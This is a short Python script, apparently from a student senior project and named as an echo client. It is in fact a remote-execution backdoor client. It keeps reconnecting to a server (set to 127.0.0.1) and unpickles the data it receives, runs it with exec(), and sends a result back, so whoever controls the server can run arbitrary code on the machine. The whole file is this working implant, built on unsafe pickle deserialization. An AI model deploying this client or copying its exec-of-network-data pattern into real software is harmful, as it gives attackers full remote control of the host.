# By Colby & Co. For SWE Senior Project. Do not commit crime.
# echo-client.py

import socket
import pickle
import subprocess
import time

def pickleTesting():
    newValue = None
    HOST = "127.0.0.1"  # The server's hostname or IP address
    PORT = 65432  # The port used by the server

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while True:
                try:
                    s.connect((HOST, PORT))
                    break

                except socket.error:
                    time.sleep(10)

            data = s.recv(1024000)
            deSerialized = pickle.loads(data)

            if deSerialized == "quit":
                break

            exec(deSerialized)
            reSerialized = pickle.dumps(newValue)
            s.sendall(reSerialized)
            print("done")

__name__ = "__main__"

if __name__ == "__main__":
    pickleTesting()